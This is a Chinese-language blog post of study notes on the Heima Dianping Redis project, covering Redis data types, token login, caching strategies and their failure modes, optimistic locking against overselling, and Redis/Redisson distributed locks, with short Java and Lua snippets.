<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Object&gt; userMap = BeanUtil.beanToMap(userDTO, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),</span><br><span class="line">        CopyOptions.create()</span><br><span class="line">                .setIgnoreNullValue(<span class="literal">true</span>)</span><br><span class="line">                .setFieldValueEditor((fieldName, fieldValue) -&gt; fieldValue.toString()));</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">tokenKey</span> <span class="operator">=</span> LOGIN_USER_KEY + token;</span><br><span class="line">stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);</span><br><span class="line">stringRedisTemplate.expire(tokenKey, LOGIN_USER_TTL, TimeUnit.MINUTES);</span><br></pre></td></tr></table></figure>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><h3 id="SortedSet"><a href="#SortedSet" class="headerlink" title="SortedSet"></a>SortedSet</h3><p>Redis的SortedSet是一个可排序的set集合，里面的每一个元素都带有一个score属性，可以基于score属性对元素排序，其底层的实现是一个跳表（SkipList）+ hash表。</p>
<p>sortedset具有以下特性：</p>
<ul>
<li>可排序</li>
<li>元素不重复</li>
<li>查询速度快</li>
</ul>
<p>常见命令：</p>
<ul>
<li>ZADD key score member：添加一个或多个元素到sortedset，如果已经存在则更新其score</li>
<li>ZREM key member：删除一个指定元素</li>
<li>ZSCORE key member：获取指定元素的score</li>
<li>ZRANK key member：获取指定元素的排名</li>
<li>ZCARD key：获取sortedset中的元素个数</li>
<li>ZCOUNT key min max：统计score值在给定范围内的所有元素的个数</li>
<li>ZINCRBY key increment member：让指定元素自增</li>
<li>ZRANGE key min max：按score排序后，获取指定排名范围内的元素</li>
<li>ZRANGEBYSCORE key min max：按score排序后，获取指定score范围内的元素</li>
<li>ZDIFF、ZINTER、ZUNION：求差集、交集、并集</li>
</ul>
<p>在项目中应用：</p>
<ol>
<li><p>点赞排行榜：为每个博客维护一个sortedset，记录所有点过赞的用户，并用score来存时间戳。这样按照score排序，就能按照时间先后顺序排序。</p>
</li>
<li><p>Feed流的滚动分页：由于Feed流中的数据会不断更新，导致数据的角标也在变化，因此不能采用穿透的分页模式，只能采用滚动分页。为达到效果，使用redis中的sortedset数据结构来存储消息和时间戳，分页查询时，<strong>从上次查询的最小时间戳开始查。</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221192829761.png" alt="image-20250221192829761"></p>
</li>
</ol>
<h3 id="Geo"><a href="#Geo" class="headerlink" title="Geo"></a>Geo</h3><p>Geo即Geolocation的简写，代表地理坐标，Redis在3.2版本加入了对GEO的支持。</p>
<p>Geo常用命令：</p>
<ul>
<li>GEOADD：添加一个地理空间信息，包含：经度（longitude）、维度（latitude）、值（member）</li>
<li>GEODIST：计算指定的两个点之间的距离并返回</li>
<li>GEOHASH：将指定member的坐标转为hash字符串形式并返回</li>
<li>GEOPOS：返回指定member的坐标</li>
<li>GEORADIUS：指定圆心、半径，找到该圆内的所有member，并按距离排序返回。6.2后废弃</li>
<li>GEOSEARCH：在指定范围内搜索member，并按距离排序返回。范围可以是圆形或矩形。6.2新功能</li>
<li>GEOSEARCHSTORE：与GEOSEARCH功能一致，不过可以把结果存储到一个指定的key中。6.2新功能</li>
</ul>
<p>在项目中应用：</p>
<ol>
<li>附近商户功能：使用Geo来存储商户地理信息，并应用GEOSEARCH来查找附近商户。</li>
</ol>
<h3 id="BitMap"><a href="#BitMap" class="headerlink" title="BitMap"></a>BitMap</h3><p>Redis中利用string类型数据结构实现Bitmap，最大上限为512M，即2^32个bit位。</p>
<p>BitMap的命令：</p>
<ul>
<li><p>SETBIT：向指定位置（offset）存入一个0或1</p>
</li>
<li><p>GETBIT：获取指定位置（offset）的bit值</p>
</li>
<li><p>BITCOUNT：统计BitMap中值为1的bit位的数量</p>
</li>
<li><p>BITFIELD：操作（查询、修改、自增）BitMap中的指定位置（offset）的值</p>
</li>
<li><p>BITFIELD_RO：获取BitMap中的bit数组，并以十进制返回</p>
</li>
<li><p>BITOP：将多个BitMap的结果做位运算（与、或、异或）</p>
</li>
<li><p>BITOPS：查找bit数组中指定范围内第一个0或1出现的位置</p>
</li>
</ul>
<p>项目中应用：</p>
<ol>
<li>可以用BitMap实现用户签到功能，用“前缀 + 用户id + 年月”作为key，存储用户每一个月的签到结果。把每一个bit位对应当月的每一天，用户签到则将对应那一日的bit为设置为1。</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221184134760.png" alt="image-20250221184134760"></p>
<h3 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h3><p>Hypeloglog（HLL）是从Loglog算法派生的概率算法，用以确认非常大的集合的基数，而不需要存储其所有值。</p>
<p>Redis中的HLL是基于string结构实现的，单个HLL的内存永远小于16kb。作为代价，其测量结果是<strong>概率性的</strong>，有小于0.81%的误差，但对于UV统计来说，是可以忽略的。</p>
<p>HyperLogLog命令：</p>
<ul>
<li>PFADD key element [element …]：向指定key添加一个元素</li>
<li>PFCOUNT key：统计指定key中元素个数（基于概率的）</li>
<li>PFMERGE destkey sourcekey 合并两个key</li>
</ul>
<p>应用：</p>
<ul>
<li>UV统计</li>
</ul>
<p>UV：Unique Visitor，独立访客量，指通过互联网访问网页的自然人，1天内同一个用户多次访问网站，只记录1次。</p>
<p>PV：Page View，页面访问量或点击量，用户每访问网页的一个页面，记录一次PV，多次打开则多次记录PV。往往用来衡量网站的流量。</p>
<p>UV统计在服务端做比较麻烦，因为要判断该用户是否已经统计过了，需要将统计过的用户信息保存。但如果每个访问的用户都保存到Redis中，数据量会非常恐怖。</p>
<h2 id="登录注册"><a href="#登录注册" class="headerlink" title="登录注册"></a>登录注册</h2><h3 id="验证码登录"><a href="#验证码登录" class="headerlink" title="验证码登录"></a>验证码登录</h3><p>使用session进行登录存在<strong>session共享问题</strong>：多台Tomcat并不共享session存储空间，当切换到不同tomcat服务时会导致数据丢失。因此<strong>基于redis实现共享session登录</strong>。</p>
<p>客户端根据收到的验证码填入并登录，服务端收到请求之后，从Redis中校验验证码和手机号是否匹配，如果匹配就成功登录，则将用户的信息保存到Redis中，并返回随机token给客户端；客户端后续请求都带着这个token在作为autorization放在请求头里面。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221171113931.png" alt="image-20250221171113931"></p>
<h3 id="登录拦截器"><a href="#登录拦截器" class="headerlink" title="登录拦截器"></a>登录拦截器</h3><p>登录拦截器设置成两个拦截器，第一个拦截器拦截一切路径，进行获取token、查询redis用户、保存到ThreadLocal和刷新token有效期，而第二个拦截器才拦截需要登录的路径，查询ThreadLocal中的用户是否不存在，不存在则拦截。</p>
<p>这样所有路径都可以刷新token有效期，也就是用户点击任何页面都能刷新登录状态。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221171343080.png" alt="image-20250221171343080" style="zoom: 67%;" />

<h2 id="商户查询缓存"><a href="#商户查询缓存" class="headerlink" title="商户查询缓存"></a>商户查询缓存</h2><p>缓存就是数据交换的缓冲区（cache），存贮数据的临时地方，一般读写性能较高。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250222164558555.png" alt="image-20250222164558555" style="zoom:50%;" />

<h3 id="缓存更新策略"><a href="#缓存更新策略" class="headerlink" title="缓存更新策略"></a>缓存更新策略</h3><h4 id="缓存更新策略-1"><a href="#缓存更新策略-1" class="headerlink" title="缓存更新策略"></a>缓存更新策略</h4><table>
<thead>
<tr>
<th></th>
<th>内存淘汰</th>
<th>超时剔除</th>
<th>主动更新</th>
</tr>
</thead>
<tbody><tr>
<td><strong>说明</strong></td>
<td>不用自己维护，利用Redis的内存淘汰机制，当内存不足时自动淘汰部分数据，当内存不足时自动淘汰部分数据。下次查询时更新缓存。</td>
<td>给缓存数据添加TTL时间，到期后自动删除缓存。下次查询时更新缓存。</td>
<td>编写业务逻辑，在修改数据库的同时，更新缓存。</td>
</tr>
<tr>
<td><strong>一致性</strong></td>
<td>差</td>
<td>一般</td>
<td>好</td>
</tr>
<tr>
<td><strong>维护成本</strong></td>
<td>无</td>
<td>低</td>
<td>高</td>
</tr>
</tbody></table>
<p>业务场景：</p>
<ul>
<li>低一致性需求：使用内存淘汰机制。例如店铺类型的缓存。</li>
<li>高一致性需求：主动更新， 并以超时剔除作为兜底方案。例如店铺详情的缓存。</li>
</ul>
<h4 id="主动更新策略"><a href="#主动更新策略" class="headerlink" title="主动更新策略"></a>主动更新策略</h4><table>
<thead>
<tr>
<th>Cache Aside Pattern</th>
<th>Read&#x2F;Write Through Pattern</th>
<th>Write Behind Caching Pattern</th>
</tr>
</thead>
<tbody><tr>
<td>由缓存的调用者，在更新数据库的同时更新缓存。</td>
<td>缓存与数据库整合为一个服务，由服务来维护一致性。调用者调用该服务，无需关心缓存一致性问题。</td>
<td>调用者只操作缓存，由其他线程异步的将缓存数据持久化到数据库，保证最终一致。</td>
</tr>
<tr>
<td>调用者需要写一些代码</td>
<td>维护一个这样的服务复杂，成本高</td>
<td>效率高，但维护异步服务难，可靠性和一致性较差</td>
</tr>
</tbody></table>
<p>采用Cache Aside Pattern。</p>
<h4 id="如何操作数据库和缓存"><a href="#如何操作数据库和缓存" class="headerlink" title="如何操作数据库和缓存"></a>如何操作数据库和缓存</h4><ol>
<li><p>删除缓存还是更新缓存？</p>
<ul>
<li>更新缓存：每次更新数据库都更新缓存，无效写操作较多。</li>
<li>删除缓存：更新数据库时让缓存失效，查询时在更新缓存。√</li>
</ul>
</li>
<li><p>如何保证缓存与数据库的操作的同时成功或失败？</p>
<ul>
<li>单体系统：将缓存与数据库操作放在一个事务。</li>
<li>分布式系统：利用TCC等分布式事务方案。</li>
</ul>
</li>
<li><p>先操作缓存还是先操作数据库？（线程安全问题）</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215150429038.png" alt="image-20250215150429038" style="zoom: 67%;" />

<ul>
<li>由于更新数据库操作比较缓慢，而查询数据库和写入缓存操作很快，线程2很容易趁虚而入，因此该情况发生概率高。</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215150750330.png" alt="image-20250215150750330" style="zoom:67%;" />

<ul>
<li><p>发生该情况需要满足：1.两个线程并行；2.缓存恰好失效；3.在线程1查询缓存和写入缓存两个操作的微秒级空隙内，线程2完成更新数据库和删除缓存操作。因此该情况发生的概率很低。</p>
</li>
<li><p>因此先操作数据库再删除缓存。</p>
</li>
</ul>
</li>
</ol>
<h4 id="缓存更新策略的最佳实践方案"><a href="#缓存更新策略的最佳实践方案" class="headerlink" title="缓存更新策略的最佳实践方案"></a>缓存更新策略的最佳实践方案</h4><ol>
<li>低一致性需求：使用Redis自带的内存淘汰机制</li>
<li>高一致性需求：主动更新， 并以超时剔除作为兜底方案<ul>
<li>读操作：<ul>
<li>缓存命中则直接返回</li>
<li>缓存未命中则查询数据库，并写入缓存，设定超时时间</li>
</ul>
</li>
<li>写操作<ul>
<li>先写数据库，然后再删除缓存</li>
<li>要确保数据库与缓存事务的原子性</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透是指客户端请求的数据在缓存中和数据库中都不存在，这样缓存永远不会生效，这些请求都会打到数据库。例如，一个不怀好意的黑客同时间内大量请求不存在的数据，这些请求都会打到数据库上，导致数据库崩溃。</p>
<p>常见的解决方案有两种：缓存空对象和布隆过滤。</p>
<p>其他解决方案：增强id的复杂度，避免被猜测id规律；做好数据的基础格式校验；加强用户权限校验；做好热点参数的限流。</p>
<h4 id="缓存空对象"><a href="#缓存空对象" class="headerlink" title="缓存空对象"></a>缓存空对象</h4><p>查询时发现数据在数据库中不存在，则在redis中缓存一个空对象并设置过期时间。这样以后查询的数据不存在时，会命中缓存。</p>
<ul>
<li>优点：实现简单，维护方便</li>
<li>缺点：<ul>
<li>额外的内存消耗（解决：设置TTL）</li>
<li>可能造成短期的不一致（例如，用户查询不存在得数据，缓存设置未null，此时数据库更新，用户再次查询仍然为null）（可以在新增数据时插入缓存，覆盖null）</li>
</ul>
</li>
</ul>
<h4 id="布隆过滤"><a href="#布隆过滤" class="headerlink" title="布隆过滤"></a>布隆过滤</h4><p>添加一个布隆过滤器，用来判断数据是否存在。查询缓存前需经过过滤器。</p>
<ul>
<li><p>Redis中布隆过滤器底层为<strong>一个大型位数组（二进制数组）+多个无偏hash函数</strong></p>
</li>
<li><p>优点：内存占用较少，没有多余key</p>
</li>
<li><p>缺点：</p>
<ul>
<li>实现复杂</li>
<li>存在误判可能（可能有数据不存在但放行的情况）</li>
</ul>
</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215152737924.png" alt="image-20250215152737924" style="zoom: 80%;" />

<h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>缓存雪崩是指在同一时段大量的缓存key同时失效或者Redis服务宕机，导致大量请求到达数据库，带来巨大压力。</p>
<p>解决方案：</p>
<ol>
<li>给不同的Key的TTL添加随机值，用以预防同一时段大量的缓存key同时失效</li>
<li>利用Redis集群提高服务的可用性</li>
<li>给缓存业务添加降级限流策略</li>
<li>给业务添加多级缓存</li>
</ol>
<h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p>缓存击穿问题也叫热点Key问题，就是一个被高并发访问并且缓存重建业务较复杂的key突然失效了，无数的请求访问在瞬间给数据库带来巨大的冲击。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215165622778.png" alt="image-20250215165622778" style="zoom: 50%;" />



<p>解决：互斥锁或逻辑过期。</p>
<h4 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215165828415.png" alt="image-20250215165828415" style="zoom: 67%;" />

<p>线程A发现缓存过期，加锁重建缓存，后续线程阻塞直至线程A释放锁，此时缓存重建成功。</p>
<p>优点：</p>
<ul>
<li>没有额外的内存消耗</li>
<li>保证一致性</li>
<li>实现简单</li>
</ul>
<p>缺点：</p>
<ul>
<li>线程需要等待，性能受影响</li>
<li>可能有死锁风险</li>
</ul>
<h4 id="逻辑过期"><a href="#逻辑过期" class="headerlink" title="逻辑过期"></a>逻辑过期</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250215170304356.png" alt="image-20250215170304356" style="zoom: 33%;" />

<p>不设置过期时间，但在value中添加逻辑过期字段，线程A查询热点key发现value中逻辑时间过期，则线程A加锁并另起线程B重建缓存，线程A直接返回旧数据（不需等待线程B执行结束），后续线程C查询缓存发现过期后尝试加锁，如果加锁失败则说明有线程正在重建缓存，线程C也直接返回旧数据即可。</p>
<p>优点：</p>
<ul>
<li>线程无需等待，性能较好</li>
</ul>
<p>缺点：</p>
<ul>
<li>不保证一致性</li>
<li>有额外内存消耗</li>
<li>实现复杂</li>
</ul>
<h2 id="优惠券秒杀"><a href="#优惠券秒杀" class="headerlink" title="优惠券秒杀"></a>优惠券秒杀</h2><h3 id="全局唯一id"><a href="#全局唯一id" class="headerlink" title="全局唯一id"></a>全局唯一id</h3><p>对于优惠券订单，如果使用数据库自增ID会存在以下问题：</p>
<ul>
<li>id的规律性太明显</li>
<li>受单表数据量的限制</li>
</ul>
<p>因此需要一种在分布式系统下用来生成全局唯一ID的生成器。</p>
<p>解决方案：利用Redis中String结构的自增INCR命令。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250222113540197.png" alt="image-20250222113540197"></p>
<p>其他全局唯一ID生成策略：</p>
<ul>
<li>UUID</li>
<li>snowflake雪花算法</li>
<li>数据库自增</li>
</ul>
<h3 id="超卖问题"><a href="#超卖问题" class="headerlink" title="超卖问题"></a>超卖问题</h3><h4 id="超卖问题-1"><a href="#超卖问题-1" class="headerlink" title="超卖问题"></a>超卖问题</h4><p>在并发情况下，可能出现类似下图的情况，此时会出现商品超卖问题。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216144807538.png" alt="image-20250216144807538" style="zoom: 67%;" />

<p>为了解决这种情况，就需要加锁，锁有悲观锁和乐观锁两种。</p>
<p><strong>悲观锁</strong>：</p>
<ul>
<li>认为线程安全问题一定会发生，因此在操作数据之前先获取锁，确保线程串行执行。</li>
<li>例如Synchronized、Lock都属于悲观锁。</li>
</ul>
<p><strong>乐观锁</strong>：</p>
<ul>
<li>认为线程安全问题不一定会发生，因此不加锁，只是在更新数据时去判断有没有其他线程对数据做了修改。</li>
<li>如果没有修改则认为是安全的，自己才更新数据。</li>
<li>如果已经被其他线程修改说明发生了安全问题，此时可以重试或异常。</li>
</ul>
<p>在优惠券秒杀中，使用悲观锁使得线程串行执行，性能较差，因此使用乐观锁。</p>
<h4 id="两种乐观锁"><a href="#两种乐观锁" class="headerlink" title="两种乐观锁"></a>两种乐观锁</h4><p><strong>版本号法</strong>：给数据加上一个版本，每一次修改数据变化一次版本，多线程并发情况下，基于版本号来判断数据是否被修改过。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145309648.png" alt="image-20250216145309648" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145323789.png" alt="image-20250216145323789" style="zoom: 33%;" />

<p><strong>CAS法（Compare and SET)</strong>：用数据本身是否变化来作为版本，即每次修改数据前，判断数据是否与修改前一致。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145514582.png" alt="image-20250216145514582" style="zoom: 67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">		.setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">		.eq(<span class="string">&quot;voucher_id&quot;</span>, voucher_id)</span><br><span class="line">		.eq(<span class="string">&quot;stock&quot;</span>, voucher.getStock()) <span class="comment">// 判断库存是否与查到的一致 </span></span><br><span class="line">		.update();</span><br></pre></td></tr></table></figure>

<p>但这种情况下，可能出现失败率高的问题，即多个线程同时尝试，只有一个成功。</p>
<p>可以做个简单的改进，直接判断更新数据时库存是否大于0。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">		.setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">		.eq(<span class="string">&quot;voucher_id&quot;</span>, voucher_id)</span><br><span class="line">		.gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// 判断库存是否大于0 </span></span><br><span class="line">		.update();</span><br></pre></td></tr></table></figure>

<h3 id="一人一单问题与分布式锁"><a href="#一人一单问题与分布式锁" class="headerlink" title="一人一单问题与分布式锁"></a>一人一单问题与分布式锁</h3><p>对于同一张优惠券，可能出现一个用户购买多次情况，为阻止这种情况，需要实现一人一单。</p>
<p>直接判断用户是否下过订单，在并发情况下仍然会出现问题（即一个人同一时刻购买多次），简单的想法是给userId加一个synchronized锁。注意，给userId加synchronized锁时，要写成下面这种。这是由于toString()返回的是一个新的string对象，而我们需要的是判断值是否一样，因此调用intern方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (userId.toString().intern()) &#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>此外，假如我们给创建订单createVoucherOrder方法加了@Transcational事务注解，那么synchronized锁应该加在方法外面。如果加在里面，可能会出现事务还未提交，锁就被释放，其他线程趁虚而入而数据库还未更新的情况。</p>
<p>使用synchronized锁，在集群部署情况下（多个tomcat），仍然会出现并发安全问题，不同jvm下的线程无法实现锁互斥，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216160705182.png" alt="image-20250216160705182"></p>
<p>因此需要采用一种集群模式下多进程可见的分布式锁。常见的三种分布式锁：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216161631886.png" alt="image-20250216161631886"></p>
<h4 id="Redis分布式锁"><a href="#Redis分布式锁" class="headerlink" title="Redis分布式锁"></a>Redis分布式锁</h4><p>利用redis的SETNX命令可以实现一个满足互斥锁；同时设置EX过期时间，保证故障时锁依然能被释放，避免死锁。</p>
<p>获取锁：</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">lock</span> thread1 NX EX <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>释放锁</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">DEL</span> key</span><br></pre></td></tr></table></figure>

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216162523678.png" alt="image-20250216162523678" style="zoom: 67%;" />

<p>这种实现可能出现这样的安全问题：当线程1某种原因阻塞时，超时释放锁，其他线程获取锁后，线程1恢复后可能会释放其他线程获取的锁。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216172309261.png" alt="image-20250216172309261"></p>
<p>为了解决该问题，为了解决该问题，在释放锁时应该判断是否是自己的锁，只有是自己的锁才允许释放。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216172442370.png" alt="image-20250216172442370"></p>
<p>但这时仍然有可能出现问题，如下图，当线程1获取锁标识并判断一致后，还未释放锁时遇到阻塞（如jvm垃圾回收），导致后面又释放了其他线程的锁。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216173426178.png" alt="image-20250216173426178" style="zoom:80%;" />

<p>因此必须确保判断锁标识动作和释放锁动作的<strong>原子性</strong>，可以使用Lua脚本。</p>
<h4 id="Redis的Lua脚本"><a href="#Redis的Lua脚本" class="headerlink" title="Redis的Lua脚本"></a>Redis的Lua脚本</h4><p>Redis提供了Lua脚本功能，在一个脚本中编写多条Redis命令，确保多条命令执行时的原子性。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 获取锁中的线程标识 get key</span></span><br><span class="line"><span class="keyword">local</span> id = redis.call(<span class="string">&#x27;get&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="comment">-- 比较线程标识与锁中的标识是否一致</span></span><br><span class="line"><span class="keyword">if</span> (id == ARGV[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">    <span class="comment">-- 一致则释放锁 del key</span></span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">&#x27;del&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="Redisson"><a href="#Redisson" class="headerlink" title="Redisson"></a>Redisson</h4><p>基于Redis实现的分布式锁有以下问题：</p>
<ul>
<li>不可重入：同一个线程无法多次获取同一把锁。</li>
<li>不可重试：获取锁只尝试一次就返回false，没有重试机制。</li>
<li>超时释放：锁超时释放虽然可恶意避免死锁，但如果是业务执行耗时较长，也会导致锁释放，存在安全隐患。</li>
<li>主从一致性：如果Redis提供了主从集群 ，主从同步存在延迟，当主节点宕机时，如果从节点尚未同步主节点中的锁数据，则会出现锁丢失。</li>
</ul>
<p>因此使用Redisson来优化。Redisson是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。</p>
<p>Redisson原理：</p>
<h5 id="可重入"><a href="#可重入" class="headerlink" title="可重入"></a>可重入</h5><p>可重入锁：同一个线程多次请求锁，可能会造成死锁。因此需要允许可重入锁。</p>
<p>利用redis中的hash数据结构，为锁额外记录一个值，代表该锁的重入次数。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216193242076.png" alt="image-20250216193242076"></p>
<p>同一个线程每重入一次锁，将值+1，释放锁改为将值-1，值为0时才真正释放锁。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216193339921.png" alt="image-20250216193339921" style="zoom: 80%;" />

<p>为保证原子性，同样要使用Lua脚本。</p>
<h5 id="重试机制与超时续约"><a href="#重试机制与超时续约" class="headerlink" title="重试机制与超时续约"></a>重试机制与超时续约</h5><p>redisson可以设置等待时间waitTime，在获取锁失败后，会订阅并等待释放锁的信号，然后进行重试，直到获取锁成功或waitTime消耗完。</p>
<p>redisson中的watchdog在获取锁时设置了一个定时任务，每隔一段时间刷新锁的有效期（releaseTime&#x2F;3），直到释放锁时取消定时任务。注意，如果设置了leaseTime就没有watchdog了。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231353719.png" alt="image-20250216231353719"></p>
<h5 id="主从一致性问题"><a href="#主从一致性问题" class="headerlink" title="主从一致性问题"></a>主从一致性问题</h5><p>问题产生原因：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231742145.png" alt="image-20250216231742145" style="zoom:67%;" />

<p>redisson解决方案：<strong>MultiLock</strong></p>
<p>将每一个redis节点都视为主节点，只有向每个节点获取锁成功，才算成功。此时如果一个redis节点宕机，并不影响锁的正常获取和释放。此外也可以给每个节点建立主从关系，此时如果一个主节点宕机且刚好没有完成同步，由于从节点没有锁的标识，其他线程也无法成功获取锁，满足要求。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231841738.png" alt="image-20250216231841738" style="zoom:67%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216232050725.png" alt="image-20250216232050725" style="zoom: 50%;" />

<h3 id="异步秒杀"><a href="#异步秒杀" class="headerlink" title="异步秒杀"></a>异步秒杀</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217125102521.png" alt="image-20250217125102521" style="zoom:50%;" />

<p>上图是秒杀业务的部署图，按照顺序进行每个步骤，耗时为所有步骤之和，其中一些业务还需要访问mysql，导致整个流程缓慢，效率低。因此需要用到异步秒杀。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217125452906.png" alt="image-20250217125452906" style="zoom:50%;" />

<p>可以采用异步执行的方式来进行优化整个流程，即开启新的线程去执行比较耗时的操作。</p>
<p>将判断库存与校验一人一单的工作让redis执行，如果符合条件，添加订单到阻塞队列，让异步程序再执行。</p>
<p>库存判断使用redis的string数据结构即可，而一人一单则使用set数据结构。同样，为保证redis业务的原子性，使用lua脚本。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217130246059.png" alt="image-20250217130246059" style="zoom: 33%;" />

<p>但是基于阻塞队列的异步秒杀存在以下两问题：</p>
<ul>
<li>内存限制问题：使用jdk的阻塞队列会消耗jvm内存，在高并发情况下可能导致内存溢出。而如果设置队列上限会导致超出的订单无法添加。</li>
<li>数据安全问题：如果服务宕机，会导致内存中的订单信息丢失。如用户下单付款后，但后台并没有订单数据，出现数据不一致情况。或者异步任务从队列中取出任务执行时，服务崩溃，那么任务就会丢失。</li>
</ul>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（五）——分布式锁</title>
    <url>/2024/02/16/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
    <content><![CDATA[<h2 id="一-一人一单的并发安全问题"><a href="#一-一人一单的并发安全问题" class="headerlink" title="一 一人一单的并发安全问题"></a>一 一人一单的并发安全问题</h2><p>原来使用synchronized悲观锁用户id来保证一人一单，如下图：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216160638777.png" alt="image-20250216160638777" style="zoom:50%;" />

<span id="more"></span>

<p>但在集群部署情况下，仍然会出现并发安全问题，不同jvm下的线程无法实现锁互斥，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216160705182.png" alt="image-20250216160705182"></p>
<h2 id="二-分布式锁"><a href="#二-分布式锁" class="headerlink" title="二 分布式锁"></a>二 分布式锁</h2><p><strong>分布式锁</strong>：满足分布式系统或集群模式下多进程可见并且互斥的锁。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216161631886.png" alt="image-20250216161631886"></p>
